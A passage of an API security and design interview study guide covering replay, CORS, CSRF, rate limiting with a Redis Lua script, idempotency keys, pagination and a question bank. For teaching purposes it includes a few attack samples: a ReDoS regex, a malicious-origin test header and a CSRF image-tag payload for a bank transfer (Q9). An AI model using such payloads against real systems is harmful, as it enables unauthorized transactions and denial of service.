- **Vulnerable Pattern:** State-changing POST endpoints lacking idempotency key verification, unique nonces, or timestamp skew bounds.
- **Exploit:** An authenticated user or network attacker repeats an authorized mutation request across new connections or retries.
- **Defense:** Mandatory application-level `Idempotency-Key` headers, unique request nonces, and signed request timestamps with tight skew windows.
- **Testing Strategy:** Replay identical requests concurrently and sequentially; assert only one state modification commits.
- **Common Misconception:** Believing that TLS/HTTPS prevents business replay attacks. While internal TLS sequence numbers prevent an attacker on the wire from replaying or injecting packets *within an existing transport session*, TLS provides zero defense against application-level duplicate submissions across new connections or repeated requests. Replay protection at the business layer demands application-level token deduplication.

### 15. Information Leakage through Errors and Logs
- **Threat Model:** Error responses or application logs expose internal implementation details, keys, or PII.
- **Vulnerable Pattern:** `logger.info("Login failed for: " + user.toString());` where `toString()` prints the password.
- **Exploit:** Log aggregation tool compromise leaks millions of plaintext passwords or tokens.
- **Defense:** Structured logging with automatic PII masking patterns; generic RFC 9457 error contracts.
- **Testing Strategy:** Grep log files in CI test runs for tokens, credit cards, or password patterns.
- **Common Misconception:** Believing that logs are secure because they are "internal."

### 16. Denial of Service from Expensive Workloads
- **Threat Model:** Endpoints trigger expensive computations (regex catastrophic backtracking, complex image resizing) without resource limits.
- **Vulnerable Pattern:** Unrestricted regex matching on user input (`(a+)+$`).
- **Exploit:** ReDoS input freezes the Node.js event loop or saturates CPU cores at 100%.
- **Defense:** Regex timeouts, offloading CPU-intensive tasks to worker threads, request execution timeouts.
- **Testing Strategy:** Fuzzing regex engines with long repeating character strings; verify deterministic termination.
- **Common Misconception:** Assuming multi-threading prevents CPU exhaustion (all worker threads stall).

### 17. Overly Permissive CORS
- **Threat Model:** APIs configure `Access-Control-Allow-Origin: *` while accepting credentials.
- **Vulnerable Pattern:** Reflecting the incoming `Origin` header dynamically while setting `Allow-Credentials: true`.
- **Exploit:** Malicious origin extracts private user data via AJAX.
- **Defense:** Explicit origin allowlists; never reflect arbitrary origins with credentials enabled.
- **Testing Strategy:** Send cross-origin requests with `Origin: https://malicious.com`; verify origin is rejected.
- **Common Misconception:** Believing CORS stops non-browser attackers.

### 18. Missing Rate Limits and Abuse Prevention
- **Threat Model:** Unmetered APIs allow scrapers and attackers to exhaust downstream services.
- **Vulnerable Pattern:** Endpoints without token bucket or sliding window limiters.
- **Exploit:** Scraping entire product catalogs or saturating payment partner API limits.
- **Defense:** Multi-tiered rate limiting at the API gateway and application service layer.
- **Testing Strategy:** High-throughput load injection; verify HTTP 429 response enforcement.
- **Common Misconception:** Assuming internal microservices never need rate limiting.

---

## Section 10 — CORS, CSRF, XSS, and Browser Security Boundaries

### 10.1 The Browser Security Boundary: Same-Origin Policy (SOP)

The **Same-Origin Policy (SOP)** is the foundational security model of web browsers. An **origin** is defined as the tuple: `(Protocol, Host, Port)`.
- `https://example.com:443/app` and `https://example.com:443/api` = **Same Origin**
- `http://example.com` vs. `https://example.com` = **Different Origin** (Protocol mismatch)
- `https://api.example.com` vs. `https://example.com` = **Different Origin** (Host mismatch)
- `https://example.com:8080` vs. `https://example.com:443` = **Different Origin** (Port mismatch)

Under SOP, scripts running in one origin cannot read responses or access DOM contents from another origin unless explicitly permitted.

---

### 10.2 Cross-Origin Resource Sharing (CORS)

CORS is **not a security feature that protects your API from attackers**; CORS is a mechanism that allows a server to relax the browser's Same-Origin Policy so legitimate frontend web applications can read cross-origin responses.

> **Critical Interview Truth:** Non-browser clients (cURL, Postman, Python scripts, malicious botnets) **do not enforce CORS**. A server that relies on CORS as an authorization or authentication boundary is completely unprotected!

```
[ Browser Client ]                                     [ API Server ]
        |                                                    |
        | 1. Preflight Request (OPTIONS /api/v1/orders)      |
        |    Origin: https://app.frontend.com                |
        |    Access-Control-Request-Method: POST             |
        |    Access-Control-Request-Headers: Content-Type,   |
        |                                    Authorization   |
        |--------------------------------------------------->|
        |                                                    |
        | 2. Preflight Response                              |
        |    Access-Control-Allow-Origin:                    |
        |        https://app.frontend.com                    |
        |    Access-Control-Allow-Methods: POST, OPTIONS     |
        |    Access-Control-Allow-Headers: Authorization,... |
        |    Access-Control-Max-Age: 3600                    |
        |<---------------------------------------------------|
        |                                                    |
        | 3. Actual Request (POST /api/v1/orders)            |
        |    Authorization: Bearer eyJhbGci...               |
        |--------------------------------------------------->|
        | 4. Actual Response (201 Created)                   |
        |<---------------------------------------------------|
```

#### Credentialed CORS Rules
When an API transmits cookies or HTTP authentication cross-origin:
- Client sets `credentials: 'include'`.
- Server **must** respond with `Access-Control-Allow-Credentials: true`.
- **The Wildcard Restriction:** When credentials are true, `Access-Control-Allow-Origin` **cannot be `*`**. The browser will outright reject the response. The server must explicitly reflect an authorized, allowlisted origin.

#### Critical Distinction: Request Sending vs. Response Reading
A widespread and dangerous engineering misconception is that CORS prevents cross-origin requests from reaching the server.

In reality, the browser's Same-Origin Policy governs **reading responses**, not **sending requests**:
1. **Simple Requests Execute Unhindered:** For "simple requests" (e.g., standard `GET` requests, or `POST` requests with content-types like `application/x-www-form-urlencoded` or `multipart/form-data` lacking custom headers), the browser **transmits the request immediately without a preflight**.
2. **Server State Mutates:** The backend API processes the request, mutates database records, and dispatches external calls.
3. **Browser Intervenes at Response Time:** Only after the server sends its HTTP response does the browser check for `Access-Control-Allow-Origin`. If missing or unauthorized, the browser prevents the client script from *reading* the response data.
4. **Why CORS Never Protects Against CSRF:** Because the state mutation already committed on the server, CORS offers **zero defense against Cross-Site Request Forgery (CSRF)**. An attacker does not need to read the response to inflict damage. Defending against CSRF demands explicit server-side defenses: `SameSite` cookie policies, anti-CSRF synchronizer tokens, or custom headers (which force a preflight).

---

### 10.3 Comparative Security Matrix: SOP vs. CORS vs. CSRF vs. XSS

```
+-----------+----------------------+--------------------+--------------------------------+--------------------------------------+
| Mechanism | Threat / Scope       | Enforced By        | Fundamental Mechanism          | Primary Engineering Defense          |
+-----------+----------------------+--------------------+--------------------------------+--------------------------------------+
| SOP       | Cross-origin data    | Browser Web Engine | Blocks scripts from reading    | Native browser security boundary;    |
|           | exfiltration         |                    | cross-origin responses.        | cannot be disabled by backend.       |
| CORS      | SOP relaxation for   | Browser Web Engine | HTTP response headers grant    | Strict origin allowlisting; never    |
|           | legitimate web apps  |                    | permission to read data.       | reflect wildcard with credentials.   |
| CSRF      | Unauthorized state   | Target Server      | Browser auto-attaches cookies  | SameSite=Strict/Lax cookies; anti-   |
|           | mutation via browser |                    | on cross-site requests.        | CSRF tokens; custom request headers. |
| XSS       | Script execution in  | Browser Web Engine | Attacker injects script into   | Contextual output encoding; CSP;     |
|           | trusted origin       |                    | trusted origin context.        | HttpOnly cookies for credentials.    |
+-----------+----------------------+--------------------+--------------------------------+--------------------------------------+
```

---

## Section 11 — Rate Limiting, Quotas, and Abuse Prevention

### 11.1 Rate Limits vs. Quotas

- **Rate Limit:** A high-resolution, short-term velocity constraint designed to protect system stability, thread pools, and downstream databases (e.g., 100 requests per second).
- **Quota:** A low-resolution, long-term business or billing constraint governing resource consumption (e.g., 500,000 API requests per month on a Developer Tier subscription).

---

### 11.2 Deep Analysis of Rate Limiting Algorithms

```
+------------------------+---------------------+------------------+------------------------------------+------------------------------------+
| Algorithm              | Time Complexity     | Space Overhead   | Key Advantage                      | Primary Failure Mode               |
+------------------------+---------------------+------------------+------------------------------------+------------------------------------+
| Fixed Window Counter   | O(1)                | O(1) per client  | Trivial memory & implementation.   | Boundary bursting: 2x allowed      |
|                        |                     | (single integer) |                                    | traffic at window reset edges.     |
| Sliding Window Log     | Implementation dep. | O(N) per client  | Perfectly accurate; zero boundary  | Severe memory bloat under high     |
|                        | (O(log M + K) Redis)| (all timestamps) | burst vulnerabilities.             | volume traffic spikes.             |
| Sliding Window Counter | O(1)                | O(1) per client  | Smooth rate curve; constant memory | Approximates rate based on weighted|
|                        |                     | (2 integers)     | footprint.                         | previous window overlap.           |
| Token Bucket           | O(1)                | O(1) per client  | Supports controlled burstiness     | Complex clock synchronization      |
|                        |                     | (tokens + time)  | up to bucket capacity.             | across distributed nodes.          |
| Leaky Bucket           | O(1)                | O(Queue Size)    | Guarantees smooth, constant-rate   | Drops bursts immediately once      |
|                        |                     |                  | egress to protect legacy DBs.      | queue buffer is saturated.         |
+------------------------+---------------------+------------------+------------------------------------+------------------------------------+
```

#### The Fixed Window Boundary Burst Vulnerability
Suppose a rate limit allows 100 requests per minute. An attacker sends 100 requests at 10:00:59, and another 100 requests at 10:01:01. Both individual 1-minute windows respect the 100-request limit. However, across the 2-second window from 10:00:59 to 10:01:01, **200 requests surged into the backend**, doubling capacity limits and potentially crashing downstream services!

---

### 11.3 Distributed Rate Limiting with Redis & Atomic Lua Scripts

In distributed microservices, application instances cannot rely on in-memory counters. A shared Redis cluster provides unified state. To eliminate race conditions between reading and updating counters, the operation **must execute atomically via a Redis Lua script**.

#### The Sorted Set (ZSET) Member Collision Bug
A notorious implementation bug in Redis sliding-window limiters is executing `redis.call('ZADD', key, now, now)`. In Redis Sorted Sets, members are strictly unique. If multiple requests arrive within the **same millisecond**, using the timestamp alone as the member causes collision: Redis simply updates the existing member's score rather than inserting a new element! Consequently, `ZCARD` never increments, allowing high-frequency bursts to bypass the rate limit completely.

To prevent member collision, each request must append a unique identifier (UUID, sequence number, or random nonce):

```lua
-- Redis Sliding Window Log Lua Script (Atomic execution)
-- KEYS[1]: Rate limit key (e.g., rate:user_42)
-- ARGV[1]: Current Unix Timestamp in milliseconds
-- ARGV[2]: Window size in milliseconds
-- ARGV[3]: Maximum allowed requests in window
-- ARGV[4]: Unique Request ID / Nonce (prevents same-millisecond ZSET member collision)

local key = KEYS[1]
local now = tonumber(ARGV[1])
local window = tonumber(ARGV[2])
local limit = tonumber(ARGV[3])
local requestId = ARGV[4]
local clearBefore = now - window

-- 1. Remove expired timestamps outside the sliding window: O(log(M) + K)
redis.call('ZREMRANGEBYSCORE', key, 0, clearBefore)

-- 2. Count active requests within the window: O(1)
local currentRequests = redis.call('ZCARD', key)

if currentRequests < limit then
    -- 3. Add unique member (now:requestId) with score = now: O(log(M))
    local uniqueMember = now .. ':' .. requestId
    redis.call('ZADD', key, now, uniqueMember)

    -- Set TTL to clean up inactive keys once the sliding window elapses
    redis.call('PEXPIRE', key, window + 1000)
    return {1, limit - currentRequests - 1} -- Allowed, remaining quota
else
    return {0, 0} -- Denied
end
```

#### Production Considerations: Clock Skew, Expiration, and Memory Footprint
1. **Clock Skew Assumptions:** Passing client or application server timestamps as `ARGV[1]` assumes reasonable NTP synchronization across application nodes. If servers suffer severe clock drift, window evaluation can become erratic. In strict environments, the Redis `TIME` command can be used inside Redis, though it requires formatting.
2. **Key Expiration Policy:** The script applies `PEXPIRE` with a modest safety buffer (`window + 1000` ms) so idle keys are automatically garbage collected without leaking RAM, while active clients keep their sliding window history intact.
3. **Memory Trade-offs ($O(N)$ vs. $O(1)$):** While the sliding-log approach offers mathematically exact rate limiting, storing individual member strings for millions of requests requires substantial RAM ($O(N)$ per client). For ultra-high-throughput public gateways, a **Two-Counter Sliding Window** (approximating current rate via weighted sum of current and previous window counts) or a **Token Bucket** ($O(1)$ memory, storing only token count and timestamp) is substantially more memory-efficient.

---

## Section 12 — Idempotency, Retries, and Reliable API Operations

### 12.1 The Ambiguous Timeout Problem

In distributed networks, when a client receives a read timeout or connection drop, the outcome of the operation is completely unknown:

```
[ Client ]                           [ Network ]                          [ API Server ]
    |                                     |                                     |
    | 1. POST /api/v1/payments            |                                     |
    |------------------------------------>|------------------------------------>|
    |                                     |                                     |
    |                                     |  2. Server commits database write;  |
    |                                     |     charges credit card $500.       |
    |                                     |                                     |
    |                     X  <------------|-- 3. Server sends 201 Created;      |
    |                     |  (Packet lost)|      response drops on network!     |
    |                     |               |                                     |
    | 4. Client Read Timeout!             |                                     |
    |    "Did the payment succeed or fail?"                                     |
```
If the client blindly retries, the user is charged twice. If the client assumes success, orders fail to fulfill. **The network is inherently unreliable.**

---

### 12.2 Designing an Idempotency-Key Mechanism

For non-idempotent operations (`POST`), clients supply a unique `Idempotency-Key` header (typically a UUID v4).

#### Idempotency Storage Schema (PostgreSQL)
```sql
CREATE TABLE idempotency_records (
    idempotency_key VARCHAR(64) PRIMARY KEY,
    client_id VARCHAR(64) NOT NULL,
    endpoint VARCHAR(255) NOT NULL,
    request_hash CHAR(64) NOT NULL, -- SHA-256 hash of the request body
    status VARCHAR(30) NOT NULL,    -- 'IN_PROGRESS', 'COMPLETED', 'FAILED', 'RECONCILIATION_REQUIRED'
    response_code INT,
    response_body TEXT,
    locked_until TIMESTAMP WITH TIME ZONE NOT NULL, -- Lease expiration for worker crash recovery
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP WITH TIME ZONE NOT NULL
);

CREATE INDEX idx_idempotency_expiry ON idempotency_records(expires_at);
CREATE INDEX idx_idempotency_locked ON idempotency_records(locked_until) WHERE status = 'IN_PROGRESS';
```

#### The Atomic State Machine Lifecycle
1. **Atomic Key Reservation:** Inside a database transaction, attempt an atomic insert with a bounded execution lease:
   ```sql
   INSERT INTO idempotency_records (idempotency_key, client_id, endpoint, request_hash, status, locked_until, expires_at)
   VALUES (:key, :clientId, :endpoint, :hash, 'IN_PROGRESS', NOW() + INTERVAL '30 SECONDS', NOW() + INTERVAL '24 HOURS')
   ON CONFLICT (idempotency_key) DO NOTHING;
   ```
2. **Evaluate Reservation & Collision:**
   - **Reservation Won:** If a row was inserted, the current worker holds the execution lease. Proceed to business logic.
   - **Collision (Key Already Exists):**
     - **Payload Hash Mismatch:** If `request_hash` differs from the stored record, the client reused an idempotency key with a mutated payload. Return `422 Unprocessable Content` or `400 Bad Request`.
     - **`IN_PROGRESS` (Active Lease):** If `status = 'IN_PROGRESS'` and `locked_until > NOW()`, a concurrent duplicate request or original worker is actively executing. Return `409 Conflict` (with recommended `Retry-After: 5`).
     - **`COMPLETED`:** Safe deterministic replay! Return the cached `response_code` and `response_body` with header `Idempotent-Replayed: true`.
     - **`RECONCILIATION_REQUIRED`:** A previous worker encountered an ambiguous timeout with an external downstream provider. Return `409 Conflict` or `503 Service Unavailable` indicating the transaction is awaiting verification.
3. **Execution Boundaries & Downstream Idempotency:**
   - **Local Database Transactions:** Keep local state mutations within a transactional boundary.
   - **External Side Effects (Payment APIs, Webhooks):** When calling external payment gateways (e.g., Stripe, Adyen), the server **must propagate a downstream provider-side idempotency key** derived deterministically from the client key (e.g., `Stripe-Idempotency-Key: pay_` + `:key`).
4. **Failure Handling, Worker Crashes, and Reconciliation:**
   - **Why Deleting `IN_PROGRESS` on Exception Is Unsafe:** A naive pattern deletes the idempotency record whenever any exception is thrown. **This is dangerous if external side effects were initiated!** If a worker dispatches a payment to an external API and experiences a local network timeout waiting for the response, deleting the key allows the client's next retry to dispatch a *second* charge, causing duplicate financial transactions.
   - **Pure Local Failures:** If an exception occurs strictly within the local database transaction *before* any external RPCs, rolling back the transaction and deleting or marking the record `FAILED` is safe.
   - **Ambiguous External Failures:** If an error occurs during or after external dispatch, transition the status to `RECONCILIATION_REQUIRED`. A background recovery worker or webhook processor must query the external provider using the provider-side idempotency key to determine if the charge succeeded before completing or failing the transaction.
   - **Worker Crashes & Leases:** If a server process abruptly dies, `locked_until` ensures the key is not permanently blocked. Once the lease expires, subsequent retries or recovery workers can detect the dead worker and trigger reconciliation.
   - **No Exact-Once Execution Guarantee:** In distributed systems, network partitions and arbitrary failures make true "exactly-once" external execution physically impossible (the Two Generals' Problem). Idempotency guarantees **at-most-once or effectively-once execution** through deterministic deduplication and state reconciliation.

---

### 12.3 Safe Retries: Exponential Backoff and Full Jitter

Clients retrying failed requests must implement exponential backoff with full jitter to avoid **Thundering Herd** collapses of recovering services:

$$\text{Sleep Time} = \text{random}(0, \min(M, B \cdot 2^{\text{attempt}}))$$

Where $B$ is base backoff (e.g., 500 ms) and $M$ is maximum ceiling (e.g., 30 seconds).

---

## Section 13 — Pagination, Versioning, and API Evolution

### 13.1 Offset Pagination vs. Keyset (Cursor) Pagination

```
+--------------------+------------------------------------+------------------------------------+
| Dimension          | Offset Pagination (LIMIT, OFFSET)  | Keyset / Cursor Pagination (WHERE) |
+--------------------+------------------------------------+------------------------------------+
| SQL Query Pattern  | SELECT * FROM orders               | SELECT * FROM orders               |
|                    | ORDER BY created_at DESC           | WHERE (created_at, id) < (:c, :id) |
|                    | LIMIT 20 OFFSET 100000;            | ORDER BY created_at DESC, id DESC  |
|                    |                                    | LIMIT 20;                          |
| Performance Engine | O(N) Engine Scan. Scans and        | O(log N) B-Tree Seek (requires     |
| Complexity         | discards 100,000 rows in memory!   | composite index on sort columns).  |
| Stability Under    | UNSTABLE. Inserting a new row at   | STABLE for append-only streams with|
| Concurrent Writes  | row 0 shifts all pages, causing    | unique tie-breakers; avoids offset |
|                    | duplicate or missing rows!         | item drift.                        |
| Deep Paging Cost   | Catastrophic at high offsets.      | Bounded B-Tree seek at any depth.  |
| Random Access      | Supports jumping directly to page 5| Sequential only (Next / Prev).     |
+--------------------+------------------------------------+------------------------------------+
```

#### Keyset Cursor Implementation and Guarantees
An opaque cursor is created by Base64URL-encoding the primary sort column combined with a unique tie-breaker (e.g., `id`):
```
Cursor String: Base64URL("2026-10-14T10:00:00Z|ord_99482")
```
When fetching the next page, the client supplies `?cursor=MjAyNi0xMC0xNFQxMDowMDowMFp8b3JkXzk5NDgy`. The server decodes the values and applies them directly to the B-Tree index predicate.

#### Critical Engineering Constraints of Keyset Pagination
Keyset pagination is not a magic performance bullet; its stability and efficiency depend on specific database conditions:
1. **Mandatory Composite Index:** Keyset pagination requires a composite B-Tree index matching the exact columns and sort order of the query (e.g., `CREATE INDEX idx_orders_created_id ON orders(created_at DESC, id DESC)`). Without this index, the query engine cannot seek the cursor position and falls back to an expensive sequential scan and filesort.
2. **Strictly Unique, Immutable Tie-Breaker:** Non-unique sort keys (such as `created_at` or `timestamp`, which frequently duplicate under concurrent write bursts) **must be paired with an immutable unique tie-breaker** (like primary key `id`). Without an immutable tie-breaker, rows sharing identical timestamps across page boundaries are skipped or duplicated.
3. **Mutable Sort Keys:** If sorting by a mutable field (`updated_at`, `ranking_score`, or `priority`), updating an entity while a user pages through results moves that row across the cursor boundary, causing it to appear on multiple pages or disappear entirely. For mutable datasets, keyset sorting should anchor on immutable creation timestamps or require snapshot isolation.
4. **Dynamic Filter Membership:** When querying with state filters (e.g., `WHERE status = 'PENDING'`), rows changing state between page requests naturally enter or exit the stream. Keyset cursors anchor position within the index, not an immutable snapshot.
5. **Seek Cost Realism:** While locating the cursor entry in a suitable B-Tree index is $O(\log N)$, overall query latency remains bounded by buffer cache hits, row fetching I/O, and MVCC visibility checks under write contention.

---

### 13.2 Additive vs. Breaking API Changes

```
+------------------------------------+------------------------------------+
| Non-Breaking (Additive) Changes    | Breaking (Incompatible) Changes    |
+------------------------------------+------------------------------------+
| Adding a new endpoint route.       | Renaming or removing an endpoint.  |
| Adding an optional query parameter.| Renaming or removing an existing   |
| Adding a new field to response JSON| response JSON property.            |
| (when clients ignore unknowns).    | Changing a field's data type       |
| Adding optional request body field.| (e.g., string -> array).           |
| Adding a new optional header.      | Making an optional field mandatory.|
+------------------------------------+------------------------------------+
```

#### The Enum Expansion Hazard
A subtle and notorious breaking change is adding a new value to an existing enum field (e.g., adding `STATUS_CANCELLED` to an `OrderStatus` enum in response JSON).
- **Why It Breaks Clients:** Strongly-typed clients in Java (Jackson), Swift (`Decodable`), or C# (`System.Text.Json`) map JSON strings directly to strict enum constants. When an un-updated client deserializes a newly introduced enum value, it throws an unhandled deserialization error (e.g., `InvalidFormatException`) and crashes the client screen.
- **Defensive Design:** Treat enum expansion as a breaking change unless clients explicitly implement **tolerant readers** (e.g., Jackson's `READ_UNKNOWN_ENUM_VALUES_AS_NULL` or `@JsonEnumDefaultValue`). When backwards compatibility is required, prefer extensible string codes or versioned endpoints.

---

## Section 14 — API Testing and Security Verification

### 14.1 The Security Testing Pyramid

Security verification requires testing at distinct boundaries:
1. **Unit Level:** Validating isolated cryptographic signatures, password hashing algorithms, and input validation schemas.
2. **Slice / Filter Chain Level:** Verifying that anonymous calls yield 401, insufficient authorities yield 403, and CORS preflights return correct headers using `@WebMvcTest` (Spring) or `supertest` (Express).
3. **Object-Level Integration:** Positive and negative authorization tests verifying that User A cannot read or mutate User B's resources.
4. **Fuzzing & Dynamic Scans:** Fuzzing APIs with OWASP ZAP to identify unhandled 500 errors and header leaks.

---

### 14.2 Compact API Security Test Matrix

```
+----------------------------+-----------------------+---------------------+---------------------+
| Test Case Description      | Request State         | Expected Status     | Invariant Verified  |
+----------------------------+-----------------------+---------------------+---------------------+
| Anonymous Access Attempt   | Missing Auth Header   | 401 Unauthorized    | AuthN filter blocks |
|                            |                       |                     | unauthenticated req |
| Invalid Token Signature    | Tampered JWT payload  | 401 Unauthorized    | Cryptographic check |
|                            |                       |                     | prevents forgery    |
| Expired Token              | exp < current_time    | 401 Unauthorized    | Expiration boundary |
| Missing Role Privilege     | User role calls Admin | 403 Forbidden       | Function level AuthZ|
| BOLA / IDOR Attempt        | User A reads Order B  | 403 or 404          | Object-level check  |
|                            |                       |                     | prevents cross-read |
| Missing Required Field     | Payload lacks email   | 400 or 422          | Schema validation   |
| Injected Unknown Field     | Payload has "role"    | 400 Bad Request     | Anti-mass-assignment|
| Malformed JSON             | Broken syntax         | 400 Bad Request     | Framing boundary    |
| Rate Limit Exhaustion      | Burst > threshold     | 429 Too Many Req    | Velocity control    |
| Concurrent Idempotency     | 2x identical POST     | 1x 201, 1x 409      | Concurrency lock    |
| Sequential Replay          | Retry completed key   | 201 (Replayed: true)| Safe cached replay  |
+----------------------------+-----------------------+---------------------+---------------------+
```

---

## Section 15 — Scenario-Driven Interview Question Bank

### Q1: Why is HTTP PUT idempotent while POST is not inherently idempotent?
- **Mechanism:** RFC 9110 defines idempotency as an operation where the side-effects of $N > 0$ identical requests on server state are identical to a single request. `PUT` defines replacement semantics for a specified target URI. Replacing resource `/users/42` with `{ "name": "Bob" }` ten times leaves user 42 in the exact same state as doing it once. Conversely, `POST` defines processing/append semantics. Sending `POST /orders` five times creates five subordinate order resources with distinct IDs.
- **Tradeoff:** `PUT` requires clients to supply complete representations, incurring larger network payload sizes on updates compared to partial mutations.
- **Misconception:** Believing that changing the HTTP response status code breaks idempotency. A `DELETE` request returning 204 on first call and 404 on subsequent calls is fully idempotent because the *server state* (resource absence) is identical.
- **Production Example:** A network drop occurs during an automated batch sync. If the endpoint is `PUT /inventory/items/sku_99`, the sync worker safely retries infinitely without risking duplicate inventory allocations.

### Q2: How do you distinguish authentication failure from authorization failure?
- **Mechanism:** Authentication (AuthN) resolves the caller's identity ("Who are you?"). Authorization (AuthZ) checks whether that verified identity has permission to execute an action on a target resource ("What may you do?").
- **Tradeoff:** Returning 403 Forbidden confirms that the resource exists, potentially leaking information to an attacker. In sensitive domains, servers return 404 Not Found to obscure existence.
- **Misconception:** Believing HTTP 401 means "Unauthorized" in the plain English sense. RFC 9110 defines 401 as unauthenticated (credentials missing/invalid), and explicitly requires a `WWW-Authenticate` response header.
- **Production Example:** If a request has an expired JWT, return `401 Unauthorized` with `WWW-Authenticate: Bearer error="invalid_token"`. If the token is valid for user Alice, but Alice requests `DELETE /api/v1/tenants/beta/settings`, return `403 Forbidden`.

### Q3: How would you prevent a user from retrieving another user's order by changing an ID in the URL?
- **Mechanism:** Implement Object-Level Authorization (BOLA/IDOR defense) at the database query boundary. Bind every query predicate to the authenticated user's ID: `WHERE id = :orderId AND user_id = :currentPrincipalId`.
- **Tradeoff:** Additional relational joins or composite indexing overhead on queries to verify ownership.
- **Misconception:** Believing that changing sequential integer IDs to UUIDs solves BOLA. UUIDs obscure IDs, but any leaked UUID allows unauthorized access if the authorization check is omitted.
- **Production Example:** An e-commerce service where `GET /api/v1/orders/{orderId}` loads the order, verifies `order.getCustomerId().equals(principal.getId())`, and throws an `AccessDeniedException` (mapped to 404/403) if false.

### Q4: When would you choose a server-side session over JWT-based access?
- **Mechanism:** Server-side sessions store opaque session IDs in a centralized database/cache (Redis), looking up state on every request. JWTs encapsulate claims within a cryptographically signed payload verified statelessly.
- **Tradeoff:** Server sessions guarantee immediate revocation and eliminate stale claims, but require centralized I/O lookups and storage infrastructure. JWTs scale horizontally across decoupled services with zero database lookups, but cannot be easily revoked before expiration.
- **Misconception:** Claiming "JWT is modern, so sessions are obsolete." Highly sensitive web apps (banking, healthcare) strongly prefer server sessions precisely because instant session termination is a regulatory and security requirement.
- **Production Example:** A consumer banking web portal uses server-side Redis sessions with `HttpOnly`, `SameSite=Strict` cookies to enable instant administrative logout upon fraud detection.

### Q5: What is the difference between an OAuth access token and an OIDC ID token?
- **Mechanism:** An OAuth 2.0 Access Token is an authorization artifact meant for the **Resource Server (API)** to grant access to specific scopes. An OpenID Connect ID Token is an identity assertion formatted as a JWT meant strictly for the **Client Application** to know who logged in.
- **Tradeoff:** Passing an ID token to a backend API violates separation of concerns and creates security vulnerabilities if claims are conflated with permissions.
- **Misconception:** Assuming that every OAuth access token is a JWT. Access tokens can be opaque strings validated via token introspection (RFC 7662).
- **Production Example:** In a mobile app, the client reads the ID token to display the user's name and avatar in the navigation drawer, but includes the Access Token in the `Authorization: Bearer` header when calling `GET /api/v1/playlists`.

### Q6: Why does a signed JWT not automatically mean it is safe to accept?
- **Mechanism:** A valid cryptographic signature only proves that the payload was created by the holder of the signing key. It does not prove that the token has not expired, that the algorithm matches expectations, or that the token was intended for this specific service.
- **Tradeoff:** Rigorous verification requires validating algorithm allowlists, expiration, `nbf`, `iss`, and `aud` headers.
- **Misconception:** Believing signature verification alone is sufficient. Attackers can present a validly signed token issued by the same IdP for a completely different microservice if `aud` is not verified.
- **Production Example:** An attacker takes an access token issued for the public `reporting-service` and sends it to the private `billing-service`. If `billing-service` skips audience validation, the attacker executes unauthorized billing mutations.

### Q7: How would you implement refresh-token rotation?
- **Mechanism:** Upon every token refresh request, the authorization server validates the existing refresh token, invalidates it immediately, and issues a new access token paired with a brand-new refresh token.
- **Tradeoff:** Requires atomic state persistence in a database/Redis to manage active refresh tokens and track token families.
- **Misconception:** Assuming refresh tokens can simply be static strings stored in the client indefinitely.
- **Production Example:** If a malicious actor intercepts a refresh token and attempts to use it after the legitimate user has already rotated it, the server detects reuse of an invalidated token and immediately invalidates the entire token family, forcing a re-login.

### Q8: Why is CORS not a replacement for authorization?
- **Mechanism:** CORS is a browser-enforced mechanism that prevents unauthorized web origins from reading cross-origin HTTP responses. Non-browser clients (cURL, scripts, Python, mobile apps) bypass browser engines and ignore CORS headers completely.
- **Tradeoff:** CORS must be paired with real backend authentication and authorization on every endpoint.
- **Misconception:** Assuming that restricting `Access-Control-Allow-Origin` prevents hackers from calling an API.
- **Production Example:** An attacker writes a Node.js script using `axios` to execute `POST /api/v1/transfers`. The script never sends an `OPTIONS` preflight, and the server processes the transfer because the developer omitted authentication checks, thinking CORS protected the route.

### Q9: When does CSRF matter, and how does cookie-based authentication change the threat model?
- **Mechanism:** CSRF occurs when a browser automatically attaches ambient authentication credentials (cookies, HTTP basic auth) to a cross-site request initiated by a malicious site.
- **Tradeoff:** Cookie-based auth simplifies browser session management, but requires defense-in-depth: `SameSite=Strict/Lax` attributes, anti-CSRF synchronizer tokens, and custom headers.
- **Misconception:** Believing that APIs using Bearer tokens in headers are vulnerable to CSRF. Browsers never automatically attach custom `Authorization` headers cross-origin.
- **Production Example:** A user logs into their web banking portal (session stored in cookie). They visit a malicious blog containing `<img src="https://bank.com/transfer?to=attacker&amount=1000">`. The browser executes the request with the user's cookies unless CSRF defenses block it.

### Q10: How would you prevent duplicate payments after client retries?
- **Mechanism:** Implement an `Idempotency-Key` header with atomic database reservation. Store the key, request payload hash, status (`IN_PROGRESS`, `COMPLETED`), and cached response.
- **Tradeoff:** Incurs database write overhead on every mutating operation and requires a retention/cleanup policy (TTL).
- **Misconception:** Assuming that executing payments inside a database transaction guarantees idempotency. A network timeout after transaction commit still causes client retries.
- **Production Example:** Stripe API idempotency. Client sends `Idempotency-Key: uuid-123`. If a timeout occurs, client retries with the same key. The server detects the completed record and replays the original charge confirmation without re-charging the card.

### Q11: What happens if an API client times out after the server commits an operation?
- **Mechanism:** The operation committed durably on the server, but the network failed to deliver the response packet before the client's socket read timer elapsed. The client experiences an ambiguous failure state.
- **Tradeoff:** The client must not assume failure. It must retry with an idempotency key or query a reconciliation endpoint (`GET /orders?clientOrderId=xyz`).
- **Misconception:** Assuming that client timeouts prove the server did not execute the operation.
- **Production Example:** An order service commits an order to PostgreSQL. A transient network partition drops the HTTP 201 packet. The client times out after 5,000 ms, retries with the same idempotency key, and receives the cached 201 response.

### Q12: How would you design a distributed rate limiter?
- **Mechanism:** Deploy a shared Redis cluster executing an atomic Lua script implementing a Sliding Window Counter or Token Bucket. Store timestamps in a Sorted Set (`ZSET`) or manage token counts with `HSET`.
- **Tradeoff:** Introduces a centralized network dependency on Redis. If Redis fails, the system must decide whether to fail open (risk overload) or fail closed (degrade user availability).
- **Misconception:** Using local in-memory rate limiters across 20 container instances (traffic is not evenly distributed, allowing 20x the desired limit).
- **Production Example:** An API Gateway checks Redis with a 2-millisecond timeout. If rate is exceeded, it immediately halts request processing and returns `429 Too Many Requests` with a `Retry-After: 30` header.

### Q13: Why can offset pagination produce confusing results under concurrent writes?
- **Mechanism:** `LIMIT 20 OFFSET 20` tells the database to scan and discard 20 rows before returning the next 20. If rows are inserted or deleted while a user navigates between pages, the entire row sequence shifts.
- **Tradeoff:** Offset pagination supports jumping to arbitrary page numbers, but degrades in performance ($O(N)$ row scan) and suffers from page drift. Keyset pagination ($O(\log N)$) is completely stable, but only supports sequential next/previous navigation.
